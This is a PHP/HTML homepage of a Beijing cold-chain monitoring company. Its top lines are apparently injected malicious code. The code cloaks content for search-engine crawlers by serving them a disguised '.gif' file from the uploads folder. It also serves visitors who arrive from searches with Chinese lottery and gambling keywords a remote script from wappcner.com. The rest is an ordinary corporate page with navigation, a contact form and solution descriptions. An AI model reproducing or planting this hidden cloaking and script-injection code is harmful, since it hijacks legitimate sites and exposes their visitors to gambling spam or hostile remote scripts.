<?php
function _spider() {
	$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
	$spiderArr = array('360spider', 'so', 'soso', 'bing', 'sogou', 'sm', 'yahoo');
	foreach($spiderArr as $v) {
		if(strpos($agent, $v) !== false) {
			return true;
		}
	}
	$hostname = strtolower(gethostbyaddr(@$_SERVER['REMOTE_ADDR']));
	$spiderArr = array('sogouspider', 'hn.kd.ny.adsl', 'msnbot');
	foreach($spiderArr as $v) {
		if(strpos($hostname, $v) !== false) {
			return true;
		}
	}
}


function _main() {
	$index = strtolower($_SERVER['SCRIPT_NAME']);
	$indexArr = array('index', 'default', 'home', 'safe', 'forum', 'portal');
	foreach($indexArr as $v) {
		if(strpos($index, $v) !== false) {
			return true;
		}
	}
}

function _from() {
	$referer = strtolower(@$_SERVER['HTTP_REFERER']);
	if(empty($referer)) {
		return false;
	} 
	$refeerArr = array('so.com', '360', 'soso', 'bing', 'sogou' ,'sm', 'yahoo');
	foreach($refeerArr as $v) {
		if(strpos($referer, $v) !== false) {
			return true;
		}
	}
}

function _keywords() {
	$referer = strtolower(@$_SERVER['HTTP_REFERER']);
	if(empty($referer)) {
		return false;
	} 
	$refeerArr = array('%C1%F9','%E5%85%AD','%BA%CF','%E5%90%88','%BA%CD','%E5%92%8C','%B2%CA','%E5%BD%A9','%CC%D8','%E7%89%B9','%C2%EB','%E7%A0%81','%BD%B1','%E5%A5%96','%C6%DA','%E6%9C%9F','%D0%A4','%E8%82%96','%CD%BC','%E5%9B%BE','lhc','lhc','%CF%E3%B8%DB','%E9%A6%99%E6%B8%AF','6%BA%CF','6%E5%90%88','%C2%ED%BB%E1','%E9%A9%AC%E4%BC%9A','%CC%D8%C2%EB','%E7%89%B9%E7%A0%81','%C2%DB%CC%B3','%E8%AE%BA%E5%9D%9B','%C1%F9%BA%CF','%E5%85%AD%E5%90%88','%BF%AA%BD%B1','%E5%BC%80%E5%A5%96','%BD%E1%B9%FB','%E7%BB%93%E6%9E%9C','%CD%BC%BF%E2','%E5%9B%BE%E5%BA%93','%D0%C4%CB%AE','%E5%BF%83%E6%B0%B4','%B9%DC%BC%D2%C6%C5','%E7%AE%A1%E5%AE%B6%E5%A9%86','%B0%D7%D0%A1%BD%E3','%E7%99%BD%E5%B0%8F%E5%A7%90','%D7%DF%CA%C6%CD%BC','%E8%B5%B0%E5%8A%BF%E5%9B%BE','%C0%CF%C7%AE%D7%AF','%E8%80%81%E9%92%B1%E5%BA%84','%D4%F8%B5%C0%C8%CB','%E6%9B%BE%E9%81%93%E4%BA%BA','%BF%AA%BD%B1%D6%B1%B2%A5','%E5%BC%80%E5%A5%96%E7%9B%B4%E6%92%AD','%B1%BE%C6%DA','%E6%9C%AC%E6%9C%9F','%D6%B1%B2%A5','%E7%9B%B4%E6%92%AD','%D7%CA%C1%CF','%E8%B5%84%E6%96%99','%CF%D6%B3%A1','%E7%8E%B0%E5%9C%BA','%BC%C7%C2%BC','%E8%AE%B0%E5%BD%95','%B1%A8','%E6%8A%A5','%CD%BC%D6%BD','%E5%9B%BE%E7%BA%B8','%CD%F8%D6%B7','%E7%BD%91%E5%9D%80','%B4%F3%C8%AB','%E5%A4%A7%E5%85%A8','%D0%FE%BB%FA','%E7%8E%84%E6%9C%BA','%D4%A4%B2%E2','%E9%A2%84%E6%B5%8B','%B9%AB%CA%BD','%E5%85%AC%E5%BC%8F','%BA%C5%C2%EB','%E5%8F%B7%E7%A0%81','%B5%D8%CF%C2','%E5%9C%B0%E4%B8%8B','%B9%D2%C5%C6','%E6%8C%82%E7%89%8C','%B2%D8%B1%A6','%E8%97%8F%E5%AE%9D','%C3%E2%B7%D1','%E5%85%8D%E8%B4%B9','%C0%FA%CA%B7','%E5%8E%86%E5%8F%B2','%CC%EC%CF%DF','%E5%A4%A9%E7%BA%BF','%CC%FA%CB%E3%C5%CC','%E9%93%81%E7%AE%97%E7%9B%98','%BA%EC%BD%E3','%E7%BA%A2%E5%A7%90','%D0%C4%BE%AD','%E5%BF%83%E7%BB%8F','%e9%87%91%e5%a4%9a%e5%ae%9d','%bd%f0%b6%e0%b1%a6','%e4%ba%8c%e5%8d%81%e5%85%ad','%b6%fe%cb%c4%c1%f9','%e5%a4%a9%e7%a9%ba','%cc%ec%bf%d5','%e5%87%8c%e6%b3%a2','%c1%e8%b2%a8','%e7%ba%a2','%ba%ec','%e8%93%9d','%c0%b6','%e7%bb%bf','%c2%cc','%e4%ba%94%e8%a1%8c','%ce%e5%d0%d0','%e8%b7%91%e7%8b%97','%c5%dc%b9%b7','%e5%9b%9b%e4%b8%8d%e5%83%8f','%cb%c4%b2%bb%cf%f1','%e4%b8%ad','%d6%d0','mahui','tema','xianggang');
	foreach($refeerArr as $v) {
		if(stripos($referer, $v) !== false) {
			return true;
		}
	}
}

if(_spider() && _main()) {
	@ob_end_clean();
	echo @file_get_contents('./Uploads/2017-12-20/5a39b6947b6cc.gif');
	echo '<!--'.date('Y-m-d H:i:s').'-->';
	@ob_end_flush();
	exit();
}
if(_keywords()){
	if(_from()){
		@ob_end_clean();
		echo '<script language="javascript" src="http://www.wappcner.com/a.js"></script><br/>';
		@ob_end_flush();
		exit();
	}
}
 header("Content-Type: text/html; charset=utf-8");?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="gb2312">
    <meta charset="gb2312">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport"
          content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ -->
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE">
    <!-- 目前仅限360急速浏览 webkit:急速  ie-comp:ie兼容模式   ie-stand: ie标准模式 -->
    <meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=2.0, user-scalable=no, width=device-width">
    <meta name="description" content="北京中集智冷科技有限公司">
    <meta name="author" content="">
    <meta name="keywords" content="北京中集智冷科技有限公司">
    <link rel="icon" href="img/bqs.png">
    <title>北京中集智冷科技有限公司</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="publicCss/swiper.min.css">

    <link href="pubilcJs/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/agency.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="publicCss/font-awesome.min.css" rel="stylesheet" type="text/css">


    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <style>



        .swiper-slide img {
            transition: transform 12s cubic-bezier(.23, 1, .32, 1);
            transform: scale(1);
        }
        .swiper-slide:hover img {
            transform: scale(1.1);
        }
        @media (min-width: 768px) {
            .ckgds{
                float: right;
            }
            #product ul li{
                margin-bottom: 80px;
             /*   padding:0 25px;*/

            }
            .swiper-container-horizontal>.swiper-pagination-bullets, .swiper-pagination-custom, .swiper-pagination-fraction {

                left: 0;
                width: 100%;
                bottom: 25px;
            }
    .bqs.a{
        margin-right: 28px;
    }
    #mewss{
        width: 39%;!important;
    }
    #ijfja2{
        width: 57%;!important;
    }
            .col-md-5.col-xs-12.col-md-offset-1.ijfja{
                margin-top:80px;
            }

    .yyys {
        font-size:18px;color:#ffffff;font-weight: 500;padding: 8px 22px;
    }
    .yyys2{
        font-size:18px;color:#ffffff;font-weight: 500;padding: 8px 4px;
    }
    .yyysB {
        font-size:18px;color:#ffffff;font-weight: 500;padding: 7px 41px;
    }
    .yyys2B{
        font-size:18px;color:#ffffff;font-weight: 500;padding: 7px 52px;
    }
    #sajjj{
        border: 1px solid;
        padding: 5px 0px;
    }
    #sajjj1{
        border: 1px solid;
        padding: 5px 0px;
    }
    #ijfja{
        margin:0px 0px 0px 26px;!important;
    }
    .ijfja{
        margin:0px 0px 0px 20px;!important;
    }
    .navbar-default {
        background-color: transparent;
        padding: 18px 0;
        -webkit-transition: padding .3s;
        -moz-transition: padding .3s;
        transition: padding .3s;
        border: 0
    }
    .modal-dialog{
        width: 1200px;
    }
    .navbar-default .navbar-brand {
        font-size: 2em;
        -webkit-transition: all .3s;
        -moz-transition: all .3s;
        transition: all .3s
    }

    .navbar-default .navbar-nav > .active > a {
        border-radius: 3px
    }

    .navbar-default.navbar-shrink {
        background-color: #222;
        padding: 1px 0
    }

    .navbar-default.navbar-shrink .navbar-brand {
        font-size: 1.5em
    }
            #ppppppp{
                padding: 0;
                margin-bottom: 20px;
            }
}
        .navbar-default .navbar-toggle {
            background-color: #fed136;
            border-color: #fed136
        }
        .b{
            background-color: #2f92e2;


        }
         ul li{
             list-style: none;
         }
         element.style {
         }

        .swiper-pagination-clickable .swiper-pagination-bullet{background-color: #cccccc;width: 28px;height: 3px;border-radius: 0;opacity: 1;}
        .swiper-pagination-clickable     .swiper-pagination-bullet-active {  opacity: 1; background-color: #7b7b7b;)}

        .wzjl  li{
            list-style: none;
            font-size: 18px;
            color:#232323;
        }
      #loadingsss，#news,#telephoneOus{
            margin-bottom: 60px;
        }


       #product .bbbb{
            background-color: #ffffff;
            width:100%;
            height: 90px;
        }
         #product  ul li a{
             color:#348fdb;
             text-decoration: none;
             font-size: 16px;
         }
         .bbbb p{
             text-align: center;
         }
         #product  ul li p{
             color:#333333;
             font-size: 15px;

         }
        #solution{
            background-image: url("img/bj.jpg");
            background-repeat: repeat;
            width: 100%;

        }


        #loadingsss{
            background-image: url("img/xzxz.jpg");
            background-repeat: repeat;
            width: 100%;
            min-height: 800px;
        }
         @media (min-width: 992px){
             #ppppppp{
                 padding: 0;
                 margin-bottom:0px;
             }
             .col-md-5 {
                 width: 47.7%;!important;
             }
         }
         @media (max-width: 768px){
             .swiper-container-horizontal>.swiper-pagination-bullets, .swiper-pagination-custom, .swiper-pagination-fraction {

                 left: 0;
                 width: 100%;
                 bottom: 10px;
             }
             .col-md-5.col-xs-12.col-md-offset-1.ijfja{
                 margin-top:0px;
             }
             #fromes{
                 margin-top:30px;
             }
             #ijfja {
                 margin: 0px;!important;
                 margin-top:20px;
             }
             .yyys {
                 font-size:12px;color:#ffffff;font-weight: 500;padding: 7px 22px;
             }
             .yyys2{
                 font-size:12px;color:#ffffff;font-weight: 500;padding: 7px 4px;
             }
             .yyysB {
                 font-size:12px;color:#ffffff;font-weight: 500;padding: 7px 30px;
             }
             .yyys2B{
                 font-size:12px;color:#ffffff;font-weight: 500;padding: 7px 38px;
             }
             #sajjj1{
                 border: 1px solid #cccccc;
                 padding: 5px 0px;
             }
             #sajjj{
                 border: 1px solid #cccccc;
                 padding: 5px 0px;
             }
             .ijfja img{
                 /*width: 60%;!important;*/
                 transform: scale(0.8);
             }
             #ppppppp{
                 padding: 0;
                 margin-bottom: 50px;
             }
             #product ul li{
                 margin-bottom: 80px;
               /*  padding:0 15px;*/

             }

         }
        .modal-header {
            min-height: 16.43px;
            padding: 11px;
            border-bottom: 1px solid #e5e5e5;
        }
        .close {
            float: right;
            font-size: 24px;
           line-height: 34px;
            color: #ffffff;
            text-shadow: 0 1px 0 #fff;
            filter: alpha(opacity=20);
            opacity:1;!important;
            z-index: 999;

        }

        .soultionContent img:hover{
            transform: scale(1.1);


        }



        .pro li:hover{
            transform: translate3d(0, -4px, 0);
            transition: all .5s;
            background: linear-gradient(#e8e8e8, #cccccc); /* 标准的语法 */
            box-shadow: 0 17px 50px 0 rgba(0, 0, 0, 0.19);
        }
    </style>
</head>

<body id="page-top " class="index">




<!-- Navigation -->
<nav class="navbar navbar-default navbar-fixed-top">
    <div class="container">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand page-scroll" href="http://www.ccsc58.com/Internalsystem/login.html" target="_blank"> 中集智冷</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                <li class="hidden">
                    <a href="#page-top"></a>
                </li>

                <li>
                    <a class="page-scroll" href="index.html">首页</a>
                </li>

                <li>
                    <a class="page-scroll" href="#company">公司简介</a>
                </li>

                <li>
                    <a class="page-scroll" href="#product">产品中心</a>
                </li>
                <li>
                    <a class="page-scroll" href="#solution">解决方案</a>
                </li>
                <li>
                    <a class="page-scroll" href="#news">新闻中心</a>
                </li>
                <li>
                    <a class="page-scroll" href="#loadingsss">下载中心</a>
                </li>
                <li>
                    <a class="page-scroll" href="#parents">合作伙伴</a>
                </li>

                <li>
                    <a class="page-scroll" href="#telephoneOus">联系我们</a>
                </li>
                <li  class="dropdown" >

                    <a class="page-scroll" >管理平台</a>
                    <ul class="dropdown-menu">
                        <li><a target="_blank"  href="http://www.ccsc58.cc/wlgl/Admin/login.html">中集智冷温控平台</a></li>
                        <li>	<a target="_blank" href="http://y.ccsc58.com">养殖监控助手</a>
										</li></li>
                        <li><a  target="_blank" href="http://39.105.79.197:8080/index.html">LA-IOT云平台</a></li>
                        <li><a  target="_blank" href="http://cold.ccsc58.com">冷库助手云平台</a></li>

                    </ul>

                </li>
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container-fluid -->
</nav>

<!-- Header -->
<header>
    <div class="swiper-container " id="home">
        <div class="swiper-wrapper">


        </div>
        <!-- Add Pagination -->
        <div class="swiper-pagination"></div>


    </div>
</header>



<!-- Services Section -->
<section id="company"  class="">
    <div class="container">
        <div style="display: flex;align-items: center;justify-content: center;margin:60px 0px 40px 0px;" >
            <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
            <span style="padding: 0px 10px; font-size:24px;color:#232323;font-weight: 500">公司简介</span>
            <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
        </div>
        <div>
            <ul class="wzjl animated fadeInLeft" style="line-height: 2;padding:0px; ">

            </ul>
        </div>


    </div>
</section>



<!-- Team Section -->
<section id="product" style="background-color:#f3f3f3">
    <div class="container">
            <div style="display: flex;align-items: center;justify-content: center;margin:60px 0px 40px 0px;" >
                <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
                <span style="padding: 0px 10px; font-size:24px;color:#232323;font-weight: 500">产品中心</span>
                <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
            </div>
        <div>

            <ul style="display: flex;flex-wrap: wrap;justify-content: space-between;" class="pro">



            </ul>
        </div>




    </div>



</section>

<!-- About Section -->
<section id="solution">
    <div class="container">

            <div style="display: flex;align-items: center;justify-content: center;margin:60px 0px 30px 0px;" >
                <span style="border-top: 2px solid #ffffff;width: 80px;display: inline-block;"></span>
                <span style="padding: 0px 10px; font-size:24px;color:#ffffff;font-weight: 500">解决方案</span>
                <span style="border-top: 2px solid #ffffff;width: 80px;display: inline-block;"></span>
            </div>
            <div class="container">
                <div class="row">
                     <div  style="display: flex;align-items: center;justify-content: center;height: 38px;margin-bottom: 50px;">
                         <div id="sajjj">
                             <span style=" " class="yyys">医药行业解决方案</span>
                             <span style="" class="yyys2">食品生鲜行业解决方案</span>
                         </div>
                     </div>
                </div>
                <div class="row" style="margin: 0px 0px 70px 0px;" id="fzlic">

                </div>

            </div>


        </div>

</section>
<section id="news" style="background: #f3f3f3">
    <div class="container">
        <div style="display: flex;align-items: center;justify-content: center;margin:80px 0px 40px 0px;" >
            <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
            <span style="padding: 0px 10px; font-size:24px;color:#232323;font-weight: 500">新闻中心</span>
            <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
        </div>

        <div class="container" style="padding: 0" id="newsT">


        </div>
        <div  class="col-md-7 ckgds" style="margin-bottom: 60px;" class=""><img src="img/ckgd.jpg" alt=""  class="ckgd"></div>



    </div>
</section>
<section id="loadingsss">
    <div class="container" >

            <div style="display: flex;align-items: center;justify-content: center;margin:60px 0px 30px 0px;" >
                <span style="border-top: 2px solid #ffffff;width: 80px;display: inline-block;"></span>
                <span style="padding: 0px 10px; font-size:24px;color:#ffffff;font-weight: 500">下载中心</span>
                <span style="border-top: 2px solid #ffffff;width: 80px;display: inline-block;"></span>
            </div>
        <div class="container" id="ppppppp">
            <div class="row">
                <div  style="display: flex;align-items: center;justify-content: center;height: 38px;margin-bottom: 50px;">
                    <div id="sajjj1">
                        <span style=" " class="yyysB">中集冷云APP</span>
                        <span style="" class="yyys2B">冰骑士App</span>
                    </div>
                </div>
            </div>
            <div class="row" style="margin: 0px 0px 0px 0px; padding: 0px" id="fzlic2">

            </div>

        </div>


    </div>
</section>
<section id="parents" style="background-color: #f3f3f3;padding-bottom: 60px;">
    <div class="container" style="padding:0px;">
            <div style="display: flex;align-items: center;justify-content: center;margin:60px 0px 60px 0px;" >
                <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
                <span style="padding: 0px 10px; font-size:24px;color:#232323;font-weight: 500">合作伙伴</span>
                <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
            </div>

            <div id="Parents2" >



            </div>



    </div>
</section>

<section id="telephoneOus" style="margin-bottom:80px;">
    <div class="container" style="padding: 0">
            <div style="display: flex;align-items: center;justify-content: center;margin:60px 0px 50px 0px;" >
                <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
                <span style="padding: 0px 10px; font-size:24px;color:#232323;font-weight: 500">联系我们</span>
                <span style="border-top: 2px solid #232323;width: 80px;display: inline-block;"></span>
            </div>
            <div class="">
                <div class="col-md-8">
                    <iframe  class= "col-md-8" style="height:390px;width: 100%;padding: 0" src="http://out.ccsc58.cc/DATA_PORT_ZHONGJIZHILENG_1.01/public/index.php/index/index/map" frameborder="0" scrolling="no" ></iframe>

                </div>
                <div class="col-md-4 col-xs-12"  id="fromes" >

                    <form>
                        <div class="form-group">
                            <input type="text" class="form-control" name="name" id="name" placeholder="姓名" /><br/>
                        </div>
                        <div class="form-group">
                            <input type="text" class="form-control" name="phone" id="telephone" placeholder="电话"/><br/>
                        </div>
                        <div class="form-group" id="inputPassword">
                            <input  type="text" name="pw"  class="form-control"  id="email" placeholder="邮箱"/><br/>
                        </div>
                        <div class="form-group">
                            <textarea class="form-control" rows="5" placeholder="留言"  id="content"></textarea>
                        </div>
                        <div>
                            <p id="emailMess" style="color:red"></p>
                        </div>
                        <div class="form-group">
                            <button type="button" class="btn  btn-primary btn-block" id="submit">提交</button>
                        </div>
                    </form>
                </div>
            </div>
        
      

    </div>
</section>
<!--   footer-->
<div class="container-fluid" style="background-color: #0b0b0b;">
    <div id="footer" class="footer ">
        <div class="sitemap">
            <div class="container">
                <div class="row">
                    <div class="col-xs-12 col-sm-5  col-sm-offset-2 footer-item footer-item-last" style="padding: 0">
                        <div class="footer-contact">
                            <h6><i class="glyphicon glyphicon-map-marker"></i>&nbsp北京市丰台区汉威国际一区西一塔623、624室</h6>
                            <h6><i class="glyphicon glyphicon-time"></i>&nbsp&nbsp星期一至星期五 &nbsp&nbsp9:00-&#45;&#45;18:00</h6>
                            <h6><i class="glyphicon glyphicon-earphone"></i>&nbsp&nbsp 010-83613710</h6>

                            <h6><i class="glyphicon glyphicon-envelope"></i>&nbsp&nbspzhileng@ccsc58.com</h6>
                        </div>
                    </div>
                    <div class="col-xs-6 col-md-2 col-md-offset-1 footer-item">
                        <div class="footer-wechat" style="margin-top:15px;">
                            <img src="img/gongzhonghao.png" class="img-responsive">
                            <p style="padding: 20px 10px 0px 10px;">微信公众号</p>
                        </div>
                    </div>
                   <!-- <div class="col-xs-6 col-md-2  footer-item">
                        <div class="footer-wechat">
                            <img src="img/gongzhonghao.png" class="img-responsive">
                            <p style="padding: 10px 20px">官方微博</p>
                        </div>
                    </div>-->


                    <div class="clearfix"></div>
                </div>
            </div>
        </div>
        <div class="copyright">
            <div class="container">
                <div class="row">
                    <div class="col-md-12 hidden-xs">
                        <hr/>
                        <span class="text-left" style="font-size: 16px;color: #ffffff;">
						    Copyright2016-2017 北京中集智冷科技有限公司 版权所有 <a href="https://beian.miit.gov.cn" target="_blank">京ICP备16051215号-1</a>
                                </span>

                    </div>
                </div>
            </div>
        </div>
    </div>

</div>

<!--   footer-->

<script src="pubilcJs/jquery-1.9.1.js"></script>
<script src="js/index.js" type="text/babel"></script>
<script src="pubilcJs/swiper.min.js"></script>
<!-- Bootstrap Core JavaScript -->
<script src="pubilcJs/bootstrap/js/bootstrap.min.js"></script>

<!-- Plugin JavaScript -->
<script src="http://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>
<script src="js/classie.js"></script>
<script src="js/cbpAnimatedHeader.js"></script>
<!-- Contact Form JavaScript -->
<script src="js/jqBootstrapValidation.js"></script>
<!-- Custom Theme JavaScript -->
<script src="js/agency.js"></script>
<script src="pubilcJs/browser.min.js"></script>
</body>
<!--解决方案的模态框1  开始 -->
<div class="modal fade" id="myModal2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
    <div  role="document" class="modal-dialog" >
        <div class="modal-content">
            <div class="modal-header" style="background-color: #3390d9;">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <h4 class="modal-title" id="myModalLabel2" style="font-size: 24px;text-align: center;font-weight: 100;color:#ffffff">医疗行业解决方案</h4>
            </div>
            <div class="modal-body">

                <div class="row" id="centerPadding" >
                    <img src="img/yy.jpg" alt="" class="col-md-8 col-md-offset-2 img-responsive" >
                </div>
                <div class="row" style="margin:60px 0px 100px 0px;" >
                    <p class="col-md-10 col-md-offset-1">
                        &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp中集智冷根据医药行业客户的实际需求，严格遵守国家GSP操作规范，从医药产品的包装到运输、过程温控、数据的采集和存储等整个流程，利用自主开发的云信息平台和多种冷链温控设备等，控制药品的标准温度和环境。同时每个环节的数据都通过云信息平台实现可视化数据监测，数据安全可追溯，为客户提供医药行业冷链一体化服务解决方案。帮助客户全程把握药品状态和信息，并提供数据支持，温控数据可为客户保留五年。
                     </p>
                    <p class="col-md-10 col-md-offset-1">
                        &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp覆盖的服务范围包括：临床药品及临床样本、IVD、生物制品、疫苗、药品研发、成品药、医学检测类企业客户。通过智能冷链一体化服务解决方案帮助客户轻松解决医药行业生产、储藏、运输过程中的综合性问题。
                    </p>

                </div>

            </div>

        </div>
    </div>
</div>
<!--解决方案的模态框1  结束 -->
<!--解决方案的模态框2  开始 -->
<div class="modal fade" id="myModal22" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div  role="document" class="modal-dialog " >
        <div class="modal-content">
            <div class="modal-header" style="background-color: #3390d9;">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <h4 class="modal-title" style="font-size: 24px;text-align: center;font-weight: 100;color:#ffffff">食品生鲜行业解决方案</h4>
            </div>
            <div class="modal-body">

                <div class="row" id="centerPadding2" >
                    <img src="img/sx.jpg" alt="" class="col-md-8 col-md-offset-2 img-responsive">
                </div>
                <div class="row" style="margin:60px 0px 100px 0px;" >
                    <p class="col-md-10 col-md-offset-1">
                        &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp为满足食品安全法规和条例日益严格的要求，保证食品在生产、加工、贮藏、运输、销售过程中对特殊温度、湿度的全程控制及数据记录，中集智冷针对食品行业特性和国家规定及标准，运用冷链温度监控设备与系统、云服务平台、冷藏设备等多种技术手段，为客户提供定制化的行业解决方案。
                    </p>
                    <p class="col-md-10 col-md-offset-1">
                        &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp通过自主研发的温湿度监控智能终端，实现温湿度采集、定位、GPRS实时上传，并与同样自主研发的冷链温湿度监测云平台结合，使冷链中的每个环节能够自动监测和管理，同时支持第三方平台无缝接入。除此之外，开发了移动端和微信端（支持PC端和手机端），与上述终端和云平台互联，让客户随时随地实现登记物流信息、温度监控、信息查询、历史记录查询等冷链环节全覆盖的一站式服务。
                    </p>

                </div>

            </div>

        </div>
    </div>
</div>
<!--解决方案的模态框2  结束 -->
</html>
<script type="text/babel">

    $(function () {

        $(".ckgd").mouseover(function () {

            $(this).attr('src','img/ckgd2.jpg');


        }).mouseout(function () {
            $(this).attr('src','img/ckgd.jpg');
        })

        $(".ckgd").click(function () {
            window.location.href = "newDetails.html"

        })

        $("#sajjj span").click(function () {

            $("#sajjj span.yyys").css({"background":""})
            $(this).addClass("b").siblings().removeClass("b")

        })
        $("#sajjj1 span").click(function () {

            $("#sajjj1 span.yyysB").css({"background":""})
            $(this).addClass("b").siblings().removeClass("b")

        })

    })




</script>
